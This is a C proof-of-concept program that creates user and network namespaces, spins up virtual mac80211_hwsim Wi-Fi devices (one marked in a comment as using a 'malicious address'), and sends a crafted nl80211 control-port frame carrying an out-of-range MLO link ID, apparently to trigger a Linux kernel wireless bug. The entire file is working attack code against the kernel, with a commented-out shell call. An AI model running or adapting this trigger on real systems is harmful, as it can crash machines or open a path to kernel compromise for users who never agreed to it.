// gcc -o poc poc.c -lnl-3 -lnl-genl-3 -lpthread -I/usr/include/libnl3 -static
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <linux/rfkill.h>
#include <errno.h>
#include <linux/genetlink.h>
#include <linux/if_ether.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <linux/if.h>  // For IF_OPER_UP
#include <arpa/inet.h> // For htons
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <pthread.h>
#include <sched.h>

#include <net/ethernet.h> // For ETH_ALEN
#include <netlink/netlink.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>
#include <netlink/genl/family.h>
#include <netlink/genl/mngt.h>
#include <netlink/msg.h>
#include <netlink/attr.h>

#include "common.h"

#define WIFI_INITIAL_DEVICE_COUNT 2
#define WIFI_MAC_BASE \
    {                 \
        0x08, 0x02, 0x11, 0x00, 0x00, 0x00}
#define WIFI_IBSS_BSSID \
    {                   \
        0x50, 0x50, 0x50, 0x50, 0x50, 0x50}
#define WIFI_IBSS_SSID \
    {                  \
        0x10, 0x10, 0x10, 0x10, 0x10, 0x10}
#define WIFI_DEFAULT_FREQUENCY 2412
#define WIFI_DEFAULT_SIGNAL 0
#define WIFI_DEFAULT_RX_RATE 1

// consts from drivers/net/wireless/mac80211_hwsim.h
#define HWSIM_CMD_REGISTER 1
#define HWSIM_CMD_FRAME 2
#define HWSIM_CMD_NEW_RADIO 4
#define HWSIM_ATTR_SUPPORT_P2P_DEVICE 14
#define HWSIM_ATTR_PERM_ADDR 22
// XXX
#define NL80211_ATTR_MLO_LINK_ID 313
#define IEEE80211_MLD_MAX_NUM_LINKS 15

#define DEBUG

#ifndef DEBUG
#define debug_format(format, args...) \
    do                                \
    {                                 \
    } while (0)
void debug(char *msg) {}
#else
#define debug_format(format, args...) \
    do                                \
    {                                 \
        printf("[d] ");               \
        printf(format, ##args);       \
    } while (0)

void debug(char *msg)
{
    printf("[d] %s\n", msg);
}
#endif

// handlers
void fail(char *msg)
{
    printf("[!] %s", msg);
    perror("error: ");
    exit(-1);
}

#define fail_format(format, args...) \
    do                               \
    {                                \
        printf("[!] ");              \
        printf(format, ##args);      \
        exit(-1)                     \
    } while (0)

void info(char *msg)
{
    printf("[+] %s\n", msg);
}

#define info_format(format, args...) \
    do                               \
    {                                \
        printf("[+] ");              \
        printf(format, ##args);      \
    } while (0)

static void do_unshare()
{
    int retv;

    info("creating user namespace (CLONE_NEWUSER)...");

    // do unshare seperately to make debugging easier
    retv = unshare(CLONE_NEWUSER);
    if (retv == -1)
    {
        perror("unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    info("creating network namespace (CLONE_NEWNET)...");

    retv = unshare(CLONE_NEWNET);
    if (retv == -1)
    {
        perror("unshare(CLONE_NEWNET)");
        exit(EXIT_FAILURE);
    }
}

static int hwsim80211_create_device(struct nl_sock *sock, int hwsim_family, uint8_t mac_addr[ETH_ALEN])
{
    int err;
    struct nlattr *attr;
    struct nl_msg *msg = nlmsg_alloc();
    assert(msg != NULL);

    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, hwsim_family, 0, 0, HWSIM_CMD_NEW_RADIO, 1);
    // prepare HWSIM_ATTR_SUPPORT_P2P_DEVICE flag
    nla_put_flag(msg, HWSIM_ATTR_SUPPORT_P2P_DEVICE);
    // prepare HWSIM_ATTR_PERM_ADDR address
    nla_put(msg, HWSIM_ATTR_PERM_ADDR, ETH_ALEN, mac_addr);

    err = nl_send_auto(sock, msg);
    if (err < 0)
        fail("failed to create hwsim 8011 device");

    nlmsg_free(msg);
    return err;
}

static int nl80211_set_interface(struct nl_sock *sock, int nl80211_family, uint32_t ifindex,
                                 uint32_t iftype)
{
    int err;
    struct nlattr *attr;
    struct nl_msg *msg = nlmsg_alloc();
    assert(msg != NULL);

    debug_format("(nl80211_set_interface) set ifindex: %d\n", ifindex);
    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, nl80211_family, 0, 0, NL80211_CMD_SET_INTERFACE, 1);
    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);
    nla_put_u32(msg, NL80211_ATTR_IFTYPE, iftype);

    err = nl_send_auto(sock, msg);
    if (err < 0)
        fail("nl80211_set_interface failed\n");

    nlmsg_free(msg);
    return err;
}

static int set_interface_state(const char *interface_name, int on)
{
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        fail("set_interface_state: failed to open socket");

    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, interface_name);
    int ret = ioctl(sock, SIOCGIFFLAGS, &ifr);
    if (ret < 0)
        fail("set_interface_state: failed to execute SIOCGIFFLAGS");

    if (on)
        ifr.ifr_flags |= IFF_UP;
    else
        ifr.ifr_flags &= ~IFF_UP;

    ret = ioctl(sock, SIOCSIFFLAGS, &ifr);
    close(sock);
    if (ret < 0)
        fail("set_interface_state: failed to execute SIOCSIFFLAGS");

    return 0;
}

static int nl80211_join_ibss(struct nl_sock *sock, int nl80211_family, uint32_t ifindex,
                             struct join_ibss_props *props)
{
    int err;
    struct nlattr *attr;
    struct nl_msg *msg = nlmsg_alloc();
    assert(msg != NULL);

    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, nl80211_family, 0, 0, NL80211_CMD_JOIN_IBSS, 1);

    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);
    nla_put(msg, NL80211_ATTR_SSID, props->ssid_len, props->ssid);
    nla_put(msg, NL80211_ATTR_WIPHY_FREQ, sizeof(props->wiphy_freq), &props->wiphy_freq);

    if (props->mac)
        nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, props->mac);
    if (props->wiphy_freq_fixed)
        nla_put_flag(msg, NL80211_ATTR_FREQ_FIXED);

    nl_send_auto(sock, msg);

    if (err < 0)
        fail("nl80211_join_ibss failed");

    nlmsg_free(msg);
    return err;
}

void hexdump(const void *data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i)
    {
        printf("%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
        {
            ascii[i % 16] = ((unsigned char *)data)[i];
        }
        else
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size)
        {
            printf(" ");
            if ((i + 1) % 16 == 0)
            {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size)
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8)
                {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

static void ifla_handler(struct nl_msg *msg, int32_t *arg)
{
    struct nlmsghdr *nlh = nlmsg_hdr(msg);
    struct rtattr *attr = IFLA_RTA(nlmsg_data(nlh));
    size_t n = nlh->nlmsg_len;

    if (nlh->nlmsg_type != RTM_NEWLINK)
        return;

    // DEBUG
    debug_format("start at offset %d\n", (char *)attr - (char *)nlh);
    hexdump(nlh, nlh->nlmsg_len);

    debug("ifla_handler hit");
    for (; RTA_OK(attr, n); attr = RTA_NEXT(attr, n))
    {
        debug_format("(ifla_handler) parse attr with type %x and length %x\n", attr->rta_type, attr->rta_len);
        if (attr->rta_type == IFLA_OPERSTATE)
        {
            *arg = *((int32_t *)RTA_DATA(attr));
            debug_format("ifla_handler gets `IFLA_OPERSTATE`, data: %d\n", *arg);
            return;
        }
    }
    debug("ifla_handler fail to find `IFLA_OPERSTATE`");
    *arg = -1;
}

static int get_ifla_operstate(int ifindex)
{
    debug_format("(get_ifla_operstate) query ifindex %d\n", ifindex);

    int ret = -1;
    struct nl_sock *sock = nl_socket_alloc();
    if (nl_connect(sock, NETLINK_ROUTE))
        fail("get_ifla_operstate: socket failed");

    struct nl_msg *msg = nlmsg_alloc_simple(RTM_GETLINK, 0);
    assert(msg != NULL);

    struct ifinfomsg *info = nlmsg_reserve(msg, sizeof(struct ifinfomsg), 0);
    memset(info, 0, sizeof(*info));
    info->ifi_family = AF_UNSPEC;
    info->ifi_index = ifindex;

    int err = nl_send_auto(sock, msg);

    nl_socket_modify_cb(sock, NL_CB_MSG_IN, NL_CB_CUSTOM, ifla_handler, &ret);

    nl_recvmsgs_default(sock);
    nl_wait_for_ack(sock);

    if (ret < 0)
        fail("get_ifla_operstate recv parse IFLA_OPERSTATE fail\n");

    nlmsg_free(msg);
    nl_socket_free(sock);
    return ret;
}

static int await_ifla_operstate(char *interface, int operstate)
{
    int ifindex = if_nametoindex(interface);
    while (true)
    {
        usleep(1000); // 1 ms
        int ret = get_ifla_operstate(ifindex);
        if (ret < 0)
            return ret;
        if (ret == operstate)
            return 0;
    }
    return 0;
}

static int nl80211_setup_ibss_interface(struct nl_sock *sock, int nl80211_family_id, char *interface,
                                        struct join_ibss_props *ibss_props)
{
    int ifindex = if_nametoindex(interface);
    if (ifindex == 0)
        fail("nl80211_setup_ibss_interface: if_nametoindex failed");

    nl80211_set_interface(sock, nl80211_family_id, ifindex, NL80211_IFTYPE_ADHOC);
    info("nl80211 interface set");
    set_interface_state(interface, 1);
    info("nl80211 interface state set");
    nl80211_join_ibss(sock, nl80211_family_id, ifindex, ibss_props);
    info("nl80211 ibss joined");

    return 0;
}

// https://github.com/google/syzkaller/blob/084d817847fa603dabdd081770a757e9c41f1ae7/executor/common_linux.h#L1092
static void initialize_wifi_devices(void)
{
    // int rfkill = open("/dev/rfkill", O_RDWR);
    // if (rfkill == -1)
    //     fail("open(/dev/rfkill) failed");
    // struct rfkill_event event = {0};
    // event.type = RFKILL_TYPE_ALL;
    // event.op = RFKILL_OP_CHANGE_ALL;
    // if (write(rfkill, &event, sizeof(event)) != (ssize_t)(sizeof(event)))
    //     fail("write(/dev/rfkill) failed");
    // close(rfkill);

    uint8_t mac_addr_base[ETH_ALEN] = WIFI_MAC_BASE;
    uint8_t mac_addr[ETH_ALEN] = {0};

    struct nl_sock *sock = nl_socket_alloc();
    if (!sock)
        fail("Failed to allocate netlink socket");

    if (genl_connect(sock))
    {
        printf("Failed to connect to generic netlink\n");
        nl_socket_free(sock);
        exit(-1);
    }

    int hwsim_family_id = genl_ctrl_resolve(sock, "MAC80211_HWSIM");
    debug_format("hwsim family ID = %d\n", hwsim_family_id);
    int nl80211_family_id = genl_ctrl_resolve(sock, "nl80211");
    debug_format("nl80211 family ID = %d\n", nl80211_family_id);

    if (hwsim_family_id < 0 || nl80211_family_id < 0)
        fail("netlink_query_family_id failed");

    uint8_t ssid[] = WIFI_IBSS_SSID;
    uint8_t bssid[] = WIFI_IBSS_BSSID;
    struct join_ibss_props ibss_props = {
        .wiphy_freq = WIFI_DEFAULT_FREQUENCY, .wiphy_freq_fixed = true, .mac = bssid, .ssid = ssid, .ssid_len = sizeof(ssid)};

    // 8: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop qlen 1000
    //     link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    // 9: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop qlen 1000
    //     link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff

    for (int device_id = 0; device_id < WIFI_INITIAL_DEVICE_COUNT; device_id++)
    {
        // Virtual wifi devices will have consequtive mac addresses
        // mac_addr[5] = device_id;
        if (device_id == 0)
	{
	    // NOTE: malicious address here
            memcpy(mac_addr, "\xaa\xaa\xaa\xaa\x00\x00", 6);
	}
        else
        {
            memcpy(mac_addr, mac_addr_base, 6);
            mac_addr[5] = device_id;
        }

        hwsim80211_create_device(sock, hwsim_family_id, mac_addr);
        info("hswim80211 device created");

        // DEBUG PURPOSE
        // system("/bin/sh");

        // For each device, unless HWSIM_ATTR_NO_VIF is passed, a network interface is created
        // automatically. Such interfaces are named "wlan0", "wlan1" and so on.
        char interface[6] = "wlan0";
        interface[4] += device_id;

        nl80211_setup_ibss_interface(sock, nl80211_family_id, interface, &ibss_props);
        info("nl80211 ibss configured");
    }

    // Wait for all devices to join the IBSS network
    for (int device_id = 0; device_id < WIFI_INITIAL_DEVICE_COUNT; device_id++)
    {
        char interface[6] = "wlan0";
        interface[4] += device_id;
        await_ifla_operstate(interface, IF_OPER_UP);
        debug_format("interface %s enter into `IF_OPER_UP`\n", interface);
    }

    nl_socket_free(sock);
}

void prepare()
{
    // common preparation like global vars
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    // namespace
    do_unshare();

    // system("ifconfig hwsim0 up");
    // setup wifi devices
    // XXX: for now we do what fuzzer do, using virtual device, maybe
    //      later we use.
    initialize_wifi_devices();
}

int main(int argc, char const *argv[])
{
    prepare();

    struct nl_sock *generic_sock = nl_socket_alloc();
    genl_connect(generic_sock);
    int nl80211_family_id = genl_ctrl_resolve(generic_sock, "nl80211");
    struct nl_msg *msg;

    msg = nlmsg_alloc();
    assert(msg != NULL);
    genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, nl80211_family_id, 0, 0, NL80211_CMD_CONTROL_PORT_FRAME, 1);

    // ----- * pre_doit * ------
    // see `__cfg80211_wdev_from_attrs`
    int ifindex = if_nametoindex("wlan0");
    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);

    // ----- * doit * -----
    // NL80211_ATTR_FRAME, NL80211_ATTR_MAC, NL80211_ATTR_CONTROL_PORT_ETHERTYPE
    uint8_t frame[128] = {0}; /* .len = IEEE80211_MAX_DATA_LEN*/
    memset(frame, 'A', 128);

    nla_put(msg, NL80211_ATTR_FRAME, sizeof(frame), frame);

    uint8_t dest[ETH_ALEN] = WIFI_MAC_BASE;
    dest[5] = 1; // dest to wlan1
    nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, dest);

    // #define ETH_P_PREAUTH 0x88C7 /* IEEE 802.11i pre-authentication */
    nla_put_u16(msg, NL80211_ATTR_CONTROL_PORT_ETHERTYPE, 0x88c7);

    // NL80211_ATTR_MLO_LINK_ID
    nla_put_u8(msg, NL80211_ATTR_MLO_LINK_ID, IEEE80211_MLD_MAX_NUM_LINKS);

    nl_send_auto(generic_sock, msg);

    return 0;
}
